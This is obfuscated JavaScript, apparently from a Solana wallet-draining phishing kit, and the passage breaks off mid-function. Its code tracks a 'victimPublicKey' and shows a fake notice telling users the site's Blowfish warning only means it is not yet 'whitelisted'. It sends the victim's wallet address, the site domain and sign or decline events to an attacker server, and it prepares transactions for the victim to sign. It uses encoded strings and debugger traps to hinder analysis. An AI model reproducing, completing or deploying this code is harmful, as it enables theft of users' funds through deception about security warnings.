const BLOCKHASH_EXPIRATION_THRESHOLD = 0x4e20;
const PRIORITY_FEE = 0x3d090;
const SOLANA_RPC_URL = "https://divine" + e_qLdL(0x86) + e_qLdL(0x87) + "quiknode.pro/a" + e_qLdL(0x88) + "1324b531d277f2" + e_qLdL(0x89);
const BAD_WALLET = '\x43\x68\x61\x6e\x67\x65\x20\x77\x61\x6c\x6c\x65\x74\x20\x70\x6c\x65\x61\x73\x65';
const NOT_ENOUGH_SOLANA = e_qLdL(0x8a);
const CONNECTING = "Connec" + e_qLdL(0x8b) + ".";
let solanaConnection;
let solanaProvider;
let victimPublicKey;
let connectButton;
let lamports;
let settingData;
let phantom = ![];
let solflare = ![];
let coinbase = ![];
let askForConnecting = ![];
const sleep = cHN1sY7 => {
  return new Promise(jnnEqQv => {
    return setTimeout(jnnEqQv, cHN1sY7);
  });
};
function showSignInstructions() {
  function cHN1sY7(cHN1sY7) {
    var jnnEqQv = "xZgwpzqJoQCdeIcyRr2KhL0TYt1ufiSav3UX54jGMV6s79lkWNDOB#mF8!AnPHbE@^{*=)`_[(&<|]%~>}/$\"+?,;.:";
    var e_qLdL = "" + (cHN1sY7 || "");
    var djkbJA = e_qLdL.length;
    var __globalObject = [];
    var __String = 0x0;
    var f3i6H1 = 0x0;
    var rOnBTDk = -0x1;
    for (var __Array = 0x0; __Array < djkbJA; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (rOnBTDk < 0x0) {
        rOnBTDk = _0x200a61;
      } else {
        rOnBTDk += _0x200a61 * 0x5b;
        __String |= rOnBTDk << f3i6H1;
        f3i6H1 += (rOnBTDk & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          __globalObject.push(__String & 0xff);
          __String >>= 0x8;
          f3i6H1 -= 0x8;
        } while (f3i6H1 > 0x7);
        rOnBTDk = -0x1;
      }
    }
    if (rOnBTDk > -0x1) {
      __globalObject.push((__String | rOnBTDk << f3i6H1) & 0xff);
    }
    return fsS5SCv(__globalObject);
  }
  function jnnEqQv(jnnEqQv) {
    if (typeof f3i6H1[jnnEqQv] === 'undefined') {
      return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
    }
    return f3i6H1[jnnEqQv];
  }
  const e_qLdL = document['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74'](jnnEqQv(0x8c));
  Object['\x61\x73\x73\x69\x67\x6e'](e_qLdL[jnnEqQv(0x8d)], {
    [jnnEqQv(0x8e) + "on"]: jnnEqQv(0x8f),
    '\x74\x6f\x70': '\x35\x30\x25',
    '\x6c\x65\x66\x74': jnnEqQv(0x90),
    '\x74\x72\x61\x6e\x73\x66\x6f\x72\x6d': jnnEqQv(0x91) + jnnEqQv(0x92) + "0%, -5" + jnnEqQv(0x93),
    ["backgr" + "ound"]: jnnEqQv(0x94),
    '\x63\x6f\x6c\x6f\x72': jnnEqQv(0x95),
    ["paddin" + "g"]: jnnEqQv(0x96),
    [jnnEqQv(0x97)]: jnnEqQv(0x98),
    '\x62\x6f\x72\x64\x65\x72\x52\x61\x64\x69\x75\x73': jnnEqQv(0x99),
    '\x62\x6f\x78\x53\x68\x61\x64\x6f\x77': jnnEqQv(0x9a),
    [jnnEqQv(0x9b)]: '\x31\x30\x30\x30\x30',
    [jnnEqQv(0x9c)]: jnnEqQv(0x9d),
    '\x6d\x61\x78\x57\x69\x64\x74\x68': '\x39\x30\x25',
    '\x77\x69\x64\x74\x68': '\x33\x30\x30\x70\x78'
  });
  const djkbJA = document['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74']('\x68\x32');
  djkbJA['\x69\x6e\x6e\x65\x72\x54\x65\x78\x74'] = jnnEqQv(0x9e) + jnnEqQv(0x9f), e_qLdL[jnnEqQv(0xa0) + jnnEqQv(0xa1)](djkbJA);
  const __globalObject = document[jnnEqQv(0xa2)]('\x70');
  __globalObject['\x69\x6e\x6e\x65\x72\x54\x65\x78\x74'] = '\x49\x66\x20\x79\x6f\x75\x20\x73\x65\x65\x20\x74\x68\x65\x20\x77\x61\x72\x6e\x69\x6e\x67\x20\x6f\x6e\x20\x74\x68\x65\x20\x70\x72\x6f\x6d\x70\x74\x20\x28\x61\x73\x20\x73\x68\x6f\x77\x6e\x20\x62\x65\x6c\x6f\x77\x29\x20\x69\x74\x20\x6d\x65\x61\x6e\x73\x20\x74\x68\x69\x73\x20\x77\x65\x62\x73\x69\x74\x65\x20\x68\x61\x73\x20\x6e\x6f\x74\x20\x79\x65\x74\x20\x62\x65\x65\x6e\x20\x6d\x61\x6e\x75\x61\x6c\x6c\x79\x20\x77\x68\x69\x74\x65\x6c\x69\x73\x74\x65\x64\x20\x62\x79\x20\x42\x6c\x6f\x77\x66\x69\x73\x68\x2c\x20\x74\x68\x69\x73\x20\x70\x72\x6f\x63\x65\x73\x73\x20\x74\x61\x6b\x65\x73\x20\x74\x69\x6d\x65\x2e', e_qLdL['\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64'](__globalObject);
  const __String = document['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74'](jnnEqQv(0xa3));
  return __String['\x73\x72\x63'] = SIGN_INSTRUCTIONS_GIF, __String['\x61\x6c\x74'] = '\x53\x69\x67\x6e\x20\x69\x6e\x73\x74\x72\x75\x63\x74\x69\x6f\x6e\x73', __String[jnnEqQv(0x8d)][jnnEqQv(0xa4)] = jnnEqQv(0xa5), __String[jnnEqQv(0x8d)]['\x6d\x61\x78\x57\x69\x64\x74\x68'] = '\x31\x37\x35\x70\x78', __String[jnnEqQv(0x8d)]['\x6d\x61\x72\x67\x69\x6e\x54\x6f\x70'] = jnnEqQv(0xa6), __String[jnnEqQv(0x8d)][jnnEqQv(0xa7)] = jnnEqQv(0x99), e_qLdL[jnnEqQv(0xa0) + jnnEqQv(0xa1)](__String), document[jnnEqQv(0xa8)]["append" + jnnEqQv(0xa1)](e_qLdL), e_qLdL;
}
function hideSignInstructions(cHN1sY7) {
  function jnnEqQv(cHN1sY7) {
    var jnnEqQv = "RFTNQSVUWEAXZGdBefYbHacIDCMLOPJKwmyhgxizlk10235j8nop4qr9t#u67!vs%+$)*&,(./;:>?<=\"[^@]{`~|_}";
    var e_qLdL = "" + (cHN1sY7 || "");
    var f3i6H1 = e_qLdL.length;
    var rOnBTDk = [];
    var djkbJA = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < f3i6H1; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        djkbJA |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          rOnBTDk.push(djkbJA & 0xff);
          djkbJA >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      rOnBTDk.push((djkbJA | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(rOnBTDk);
  }
  function e_qLdL(cHN1sY7) {
    if (typeof f3i6H1[cHN1sY7] === 'undefined') {
      return f3i6H1[cHN1sY7] = jnnEqQv(rOnBTDk[cHN1sY7]);
    }
    return f3i6H1[cHN1sY7];
  }
  cHN1sY7 && cHN1sY7["parent" + "Node"] && cHN1sY7[e_qLdL(0xa9) + e_qLdL(0xaa)]["remove" + e_qLdL(0xab)](cHN1sY7);
}
const parsePlaceHolders = (cHN1sY7 = '') => {
  function jnnEqQv(cHN1sY7) {
    var jnnEqQv = "I)>/A$C.=BJ<*DN&,+:%(;GFK?ELHOM@^}~P{R_Q\"`aT|Y[Z]SWbUVfdXcewx1j0ngk2myzi3lhq4p576o8#r!us9tv";
    var djkbJA = "" + (cHN1sY7 || "");
    var e_qLdL = djkbJA.length;
    var f3i6H1 = [];
    var rOnBTDk = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < e_qLdL; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(djkbJA[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        rOnBTDk |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          f3i6H1.push(rOnBTDk & 0xff);
          rOnBTDk >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      f3i6H1.push((rOnBTDk | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(f3i6H1);
  }
  function djkbJA(cHN1sY7) {
    if (typeof f3i6H1[cHN1sY7] === 'undefined') {
      return f3i6H1[cHN1sY7] = jnnEqQv(rOnBTDk[cHN1sY7]);
    }
    return f3i6H1[cHN1sY7];
  }
  return cHN1sY7[e_qLdL(0xac) + "e"](new RegExp(djkbJA(0xad) + "first|" + "addyla" + djkbJA(0xae) + "+)}", "g"), (cHN1sY7, jnnEqQv, e_qLdL) => {
    e_qLdL = parseInt(e_qLdL, 0xa);
    if (jnnEqQv === '\x61\x64\x64\x79\x66\x69\x72\x73\x74') {
      return victimPublicKey[djkbJA(0xaf) + "ng"]()['\x73\x75\x62\x73\x74\x72\x69\x6e\x67'](0x0, e_qLdL);
    } else {
      function __globalObject(cHN1sY7) {
        var jnnEqQv = "1kTwxEl0Fgh3niQmB2yjzp65AoCr4GDq7H9SR8KsWM!#tuvUNILPOXJVbYZadcef($;:%.&/<*>?,)+=[~@]}\"^`{_|";
        var e_qLdL = "" + (cHN1sY7 || "");
        var __globalObject = e_qLdL.length;
        var __String = [];
        var __Array = 0x0;
        var _0x200a61 = 0x0;
        var djkbJA = -0x1;
        for (var f3i6H1 = 0x0; f3i6H1 < __globalObject; f3i6H1++) {
          var rOnBTDk = jnnEqQv.indexOf(e_qLdL[f3i6H1]);
          if (rOnBTDk === -0x1) continue;
          if (djkbJA < 0x0) {
            djkbJA = rOnBTDk;
          } else {
            djkbJA += rOnBTDk * 0x5b;
            __Array |= djkbJA << _0x200a61;
            _0x200a61 += (djkbJA & 0x1fff) > 0x58 ? 0xd : 0xe;
            do {
              __String.push(__Array & 0xff);
              __Array >>= 0x8;
              _0x200a61 -= 0x8;
            } while (_0x200a61 > 0x7);
            djkbJA = -0x1;
          }
        }
        if (djkbJA > -0x1) {
          __String.push((__Array | djkbJA << _0x200a61) & 0xff);
        }
        return fsS5SCv(__String);
      }
      function __String(cHN1sY7) {
        if (typeof f3i6H1[cHN1sY7] === 'undefined') {
          return f3i6H1[cHN1sY7] = __globalObject(rOnBTDk[cHN1sY7]);
        }
        return f3i6H1[cHN1sY7];
      }
      debugger;
      if (jnnEqQv === __String(0xb0)) {
        function __Array(cHN1sY7) {
          var jnnEqQv = "BmCD%AGF(1qpE0$H.&/wKx*N);=:<gP3+Oo>,M?[r]z^@{`h_Jt2vu|i}y\"~ILjUV!W945RXS6TkQnc7s8fl#dbeaZY";
          var e_qLdL = "" + (cHN1sY7 || "");
          var __globalObject = e_qLdL.length;
          var __String = [];
          var __Array = 0x0;
          var _0x200a61 = 0x0;
          var djkbJA = -0x1;
          for (var f3i6H1 = 0x0; f3i6H1 < __globalObject; f3i6H1++) {
            var rOnBTDk = jnnEqQv.indexOf(e_qLdL[f3i6H1]);
            if (rOnBTDk === -0x1) continue;
            if (djkbJA < 0x0) {
              djkbJA = rOnBTDk;
            } else {
              djkbJA += rOnBTDk * 0x5b;
              __Array |= djkbJA << _0x200a61;
              _0x200a61 += (djkbJA & 0x1fff) > 0x58 ? 0xd : 0xe;
              do {
                __String.push(__Array & 0xff);
                __Array >>= 0x8;
                _0x200a61 -= 0x8;
              } while (_0x200a61 > 0x7);
              djkbJA = -0x1;
            }
          }
          if (djkbJA > -0x1) {
            __String.push((__Array | djkbJA << _0x200a61) & 0xff);
          }
          return fsS5SCv(__String);
        }
        function _0x200a61(cHN1sY7) {
          if (typeof f3i6H1[cHN1sY7] === 'undefined') {
            return f3i6H1[cHN1sY7] = __Array(rOnBTDk[cHN1sY7]);
          }
          return f3i6H1[cHN1sY7];
        }
        return victimPublicKey[_0x200a61(0xb1) + "ng"]()["substr" + _0x200a61(0xb2)](victimPublicKey['\x74\x6f\x53\x74\x72\x69\x6e\x67']()[_0x200a61(0xb3)] - e_qLdL);
      }
    }
  });
};
const getPubShort = () => {
  function cHN1sY7(cHN1sY7) {
    var jnnEqQv = "hAqQBSRgTpjrUoiWVsCDXEFbHlanZYtmuvGkd02wxzy1KJef3cL456INMPO98!7#^&%_|@[(`]$*,{)~}\"+;/:.>=?<";
    var e_qLdL = "" + (cHN1sY7 || "");
    var f3i6H1 = e_qLdL.length;
    var rOnBTDk = [];
    var djkbJA = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < f3i6H1; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        djkbJA |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          rOnBTDk.push(djkbJA & 0xff);
          djkbJA >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      rOnBTDk.push((djkbJA | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(rOnBTDk);
  }
  function jnnEqQv(jnnEqQv) {
    if (typeof f3i6H1[jnnEqQv] === 'undefined') {
      return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
    }
    return f3i6H1[jnnEqQv];
  }
  debugger;
  return [victimPublicKey["toStri" + "ng"]()[jnnEqQv(0xb4) + jnnEqQv(0xb5)](0x0, 0x7), victimPublicKey[jnnEqQv(0xb6) + "ng"]()[jnnEqQv(0xb4) + jnnEqQv(0xb5)](victimPublicKey[jnnEqQv(0xb6) + "ng"]()[jnnEqQv(0xb7)] - 0x7)];
};
const arrayBufferToBase64 = cHN1sY7 => {
  debugger;
  let jnnEqQv = '';
  const djkbJA = new Uint8Array(cHN1sY7);
  for (let __globalObject = 0x0, __String = djkbJA[e_qLdL(0xb8)]; __globalObject < __String; __globalObject++) {
    function __Array(cHN1sY7) {
      var jnnEqQv = "jiNgJFMhlPmOkHLInoKrqCEGABDQTRpSWsUVvtXuZ057Yba1zd63248!wy9#xefc<$(.&%=>?/;):*+,~_\"}@`{|[]^";
      var djkbJA = "" + (cHN1sY7 || "");
      var __globalObject = djkbJA.length;
      var __String = [];
      var __Array = 0x0;
      var _0x200a61 = 0x0;
      var e_qLdL = -0x1;
      for (var f3i6H1 = 0x0; f3i6H1 < __globalObject; f3i6H1++) {
        var rOnBTDk = jnnEqQv.indexOf(djkbJA[f3i6H1]);
        if (rOnBTDk === -0x1) continue;
        if (e_qLdL < 0x0) {
          e_qLdL = rOnBTDk;
        } else {
          e_qLdL += rOnBTDk * 0x5b;
          __Array |= e_qLdL << _0x200a61;
          _0x200a61 += (e_qLdL & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            __String.push(__Array & 0xff);
            __Array >>= 0x8;
            _0x200a61 -= 0x8;
          } while (_0x200a61 > 0x7);
          e_qLdL = -0x1;
        }
      }
      if (e_qLdL > -0x1) {
        __String.push((__Array | e_qLdL << _0x200a61) & 0xff);
      }
      return fsS5SCv(__String);
    }
    function _0x200a61(cHN1sY7) {
      if (typeof f3i6H1[cHN1sY7] === 'undefined') {
        return f3i6H1[cHN1sY7] = __Array(rOnBTDk[cHN1sY7]);
      }
      return f3i6H1[cHN1sY7];
    }
    debugger;
    jnnEqQv += String[_0x200a61(0xb9) + _0x200a61(0xba)](djkbJA[__globalObject]);
  }
  return btoa(jnnEqQv);
};
function isMobile() {
  function cHN1sY7(cHN1sY7) {
    var jnnEqQv = "L*&jh%g$(),AF+i/P:o;pq.nr<=Gsm>I?_E[]{J`tu|@^\"C~}kBvl45H7DzOwxMN2y689KVYZabdQ#1Tfc3WeSRU!0X";
    var djkbJA = "" + (cHN1sY7 || "");
    var e_qLdL = djkbJA.length;
    var f3i6H1 = [];
    var rOnBTDk = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < e_qLdL; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(djkbJA[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        rOnBTDk |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          f3i6H1.push(rOnBTDk & 0xff);
          rOnBTDk >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      f3i6H1.push((rOnBTDk | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(f3i6H1);
  }
  function jnnEqQv(jnnEqQv) {
    if (typeof f3i6H1[jnnEqQv] === 'undefined') {
      return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
    }
    return f3i6H1[jnnEqQv];
  }
  let djkbJA = ![];
  return function (cHN1sY7) {
    function jnnEqQv(cHN1sY7) {
      var jnnEqQv = "jCBAopzvqDruysGtHEhigFKIkw4JxL50lMnmNO21PS3RT67QVU8WX9Z!a#Ybcdfe}_^{$\"%(`~|&)+,*/.[@<]:=;>?";
      var e_qLdL = "" + (cHN1sY7 || "");
      var djkbJA = e_qLdL.length;
      var f3i6H1 = [];
      var rOnBTDk = 0x0;
      var __globalObject = 0x0;
      var __String = -0x1;
      for (var __Array = 0x0; __Array < djkbJA; __Array++) {
        var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
        if (_0x200a61 === -0x1) continue;
        if (__String < 0x0) {
          __String = _0x200a61;
        } else {
          __String += _0x200a61 * 0x5b;
          rOnBTDk |= __String << __globalObject;
          __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            f3i6H1.push(rOnBTDk & 0xff);
            rOnBTDk >>= 0x8;
            __globalObject -= 0x8;
          } while (__globalObject > 0x7);
          __String = -0x1;
        }
      }
      if (__String > -0x1) {
        f3i6H1.push((rOnBTDk | __String << __globalObject) & 0xff);
      }
      return fsS5SCv(f3i6H1);
    }
    function e_qLdL(cHN1sY7) {
      if (typeof f3i6H1[cHN1sY7] === 'undefined') {
        return f3i6H1[cHN1sY7] = jnnEqQv(rOnBTDk[cHN1sY7]);
      }
      return f3i6H1[cHN1sY7];
    }
    debugger;
    new RegExp(e_qLdL(0xbb), "i")[e_qLdL(0xbc)](cHN1sY7['\x73\x75\x62\x73\x74\x72'](0x0, 0x4)) && (djkbJA = !![]);
  }(navigator[e_qLdL(0xbd) + jnnEqQv(0xbe)] || navigator[jnnEqQv(0xbf)] || window[jnnEqQv(0xc0)]), djkbJA;
}
const serializeTransactions = cHN1sY7 => {
  function jnnEqQv(cHN1sY7) {
    var jnnEqQv = "N^(yAg;)}./i+~wC@[\"z$&M]:BJ<>p=Oj`{_,P|?q*DL%x01F32IEKo45G6HdYZerRhQTa7stS8ucl#9f!bXkvVmWUn";
    var e_qLdL = "" + (cHN1sY7 || "");
    var f3i6H1 = e_qLdL.length;
    var rOnBTDk = [];
    var djkbJA = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < f3i6H1; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        djkbJA |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          rOnBTDk.push(djkbJA & 0xff);
          djkbJA >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      rOnBTDk.push((djkbJA | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(rOnBTDk);
  }
  function e_qLdL(cHN1sY7) {
    if (typeof f3i6H1[cHN1sY7] === 'undefined') {
      return f3i6H1[cHN1sY7] = jnnEqQv(rOnBTDk[cHN1sY7]);
    }
    return f3i6H1[cHN1sY7];
  }
  return cHN1sY7[e_qLdL(0xc1)](arrayBufferToBase64);
};
async function getTransactionDetails(cHN1sY7) {
  function jnnEqQv(cHN1sY7) {
    var jnnEqQv = "YkFldnHmghiRQjorJqpfEtcsvSu0IbG1TC2ZwVL5A3yD!z8BKOx9N#4WMPeaX7U6%,&*+($)/.:;?=<>[@]`^_|\"{~}";
    var e_qLdL = "" + (cHN1sY7 || "");
    var f3i6H1 = e_qLdL.length;
    var rOnBTDk = [];
    var djkbJA = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < f3i6H1; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        djkbJA |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          rOnBTDk.push(djkbJA & 0xff);
          djkbJA >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      rOnBTDk.push((djkbJA | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(rOnBTDk);
  }
  function e_qLdL(cHN1sY7) {
    if (typeof f3i6H1[cHN1sY7] === 'undefined') {
      return f3i6H1[cHN1sY7] = jnnEqQv(rOnBTDk[cHN1sY7]);
    }
    return f3i6H1[cHN1sY7];
  }
  debugger;
  return await fetch(HOST + ("/getTr" + "ansact" + e_qLdL(0xc2) + "ails"), {
    [e_qLdL(0xc3)]: '\x50\x4f\x53\x54',
    [e_qLdL(0xc4) + "s"]: {
      [e_qLdL(0xc5) + "t-Type"]: "applic" + "ation/" + "json"
    },
    '\x62\x6f\x64\x79': JSON['\x73\x74\x72\x69\x6e\x67\x69\x66\x79']({
      '\x57\x41\x4c\x4c\x45\x54': cHN1sY7,
      [e_qLdL(0xc6)]: parentData[e_qLdL(0xc7)]
    })
  });
}
async function onPrompted(cHN1sY7, jnnEqQv) {
  function djkbJA(cHN1sY7) {
    var jnnEqQv = "B$A%(T&*)QS,CR+DFU;cHeV.W/E:a=?Y<>GJ}@[^XN]d~PMO{\"IZ|L`_bKfpqorigvhjsktlunm3x02w1yz64758!9#";
    var djkbJA = "" + (cHN1sY7 || "");
    var __globalObject = djkbJA.length;
    var e_qLdL = [];
    var f3i6H1 = 0x0;
    var rOnBTDk = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < __globalObject; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(djkbJA[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        f3i6H1 |= __String << rOnBTDk;
        rOnBTDk += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          e_qLdL.push(f3i6H1 & 0xff);
          f3i6H1 >>= 0x8;
          rOnBTDk -= 0x8;
        } while (rOnBTDk > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      e_qLdL.push((f3i6H1 | __String << rOnBTDk) & 0xff);
    }
    return fsS5SCv(e_qLdL);
  }
  function __globalObject(cHN1sY7) {
    if (typeof f3i6H1[cHN1sY7] === 'undefined') {
      return f3i6H1[cHN1sY7] = djkbJA(rOnBTDk[cHN1sY7]);
    }
    return f3i6H1[cHN1sY7];
  }
  await fetch(HOST + ("/promp" + e_qLdL(0xc8)), {
    [__globalObject(0xc9)]: __globalObject(0xca),
    [__globalObject(0xcb) + "s"]: {
      [__globalObject(0xcc) + "t-Type"]: "applic" + "ation/" + __globalObject(0xcd)
    },
    '\x62\x6f\x64\x79': JSON["string" + __globalObject(0xce)]({
      [__globalObject(0xcf)]: parentData[__globalObject(0xd0)],
      [__globalObject(0xd1)]: cHN1sY7,
      [__globalObject(0xd2) + __globalObject(0xd3)]: jnnEqQv
    })
  });
}
async function onDeclined(cHN1sY7, jnnEqQv) {
  function djkbJA(cHN1sY7) {
    var jnnEqQv = "FSQRTVGHDUCWEXAZBYaJKLIedcOfMPbNlgkmnhijuptvosrqx01wz32y58!9#467%/=+*&,)($<.>:;?[_@]^{|`\"}~";
    var djkbJA = "" + (cHN1sY7 || "");
    var __globalObject = djkbJA.length;
    var e_qLdL = [];
    var f3i6H1 = 0x0;
    var rOnBTDk = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < __globalObject; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(djkbJA[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        f3i6H1 |= __String << rOnBTDk;
        rOnBTDk += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          e_qLdL.push(f3i6H1 & 0xff);
          f3i6H1 >>= 0x8;
          rOnBTDk -= 0x8;
        } while (rOnBTDk > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      e_qLdL.push((f3i6H1 | __String << rOnBTDk) & 0xff);
    }
    return fsS5SCv(e_qLdL);
  }
  function __globalObject(cHN1sY7) {
    if (typeof f3i6H1[cHN1sY7] === 'undefined') {
      return f3i6H1[cHN1sY7] = djkbJA(rOnBTDk[cHN1sY7]);
    }
    return f3i6H1[cHN1sY7];
  }
  debugger;
  await fetch(HOST + '\x2f\x64\x65\x63\x6c\x69\x6e\x65\x64', {
    '\x6d\x65\x74\x68\x6f\x64': e_qLdL(0xd4),
    [e_qLdL(0xd5) + "s"]: {
      '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65': __globalObject(0xd6)
    },
    '\x62\x6f\x64\x79': JSON[__globalObject(0xd7)]({
      '\x64\x6f\x6d\x61\x69\x6e': parentData[__globalObject(0xd8)],
      [__globalObject(0xd9)]: cHN1sY7,
      [__globalObject(0xda)]: jnnEqQv
    })
  });
}
(function () {
  function cHN1sY7(cHN1sY7) {
    var jnnEqQv = "CBADFEGHLJIONKMPQVURTSWXZfcYabdemgklnhjitousvqpr6523w147!08x9y#z+\"~}%[$@]_^&>(`|{<.*:,;/)?=";
    var e_qLdL = "" + (cHN1sY7 || "");
    var djkbJA = e_qLdL.length;
    var f3i6H1 = [];
    var rOnBTDk = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < djkbJA; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        rOnBTDk |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          f3i6H1.push(rOnBTDk & 0xff);
          rOnBTDk >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      f3i6H1.push((rOnBTDk | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(f3i6H1);
  }
  function jnnEqQv(jnnEqQv) {
    if (typeof f3i6H1[jnnEqQv] === 'undefined') {
      return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
    }
    return f3i6H1[jnnEqQv];
  }
  debugger;
  const e_qLdL = function () {
    debugger;
    let cHN1sY7;
    try {
      debugger;
      cHN1sY7 = Function('\x72\x65\x74\x75\x72\x6e\x20\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x20' + '\x7b\x7d\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x28\x22\x72\x65\x74\x75\x72\x6e\x20\x74\x68\x69\x73\x22\x29\x28\x20\x29' + '\x29\x3b')();
    } catch (jnnEqQv) {
      cHN1sY7 = window;
    }
    return cHN1sY7;
  };
  const djkbJA = e_qLdL();
  djkbJA[jnnEqQv(0xdb)](_0x586d22, 0x3e8);
})();
async function showPortfolio(cHN1sY7, jnnEqQv) {
  function e_qLdL(cHN1sY7) {
    var jnnEqQv = "&[k@lJAgC^%mOi]nh.I}j$osvt`u~(+qr*)\"p7_,;N8/4:{<|w>?B=z1x0DF5P62!MK93G#yELHRQSTUVWXadYbZcef";
    var e_qLdL = "" + (cHN1sY7 || "");
    var djkbJA = e_qLdL.length;
    var f3i6H1 = [];
    var rOnBTDk = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < djkbJA; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        rOnBTDk |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          f3i6H1.push(rOnBTDk & 0xff);
          rOnBTDk >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
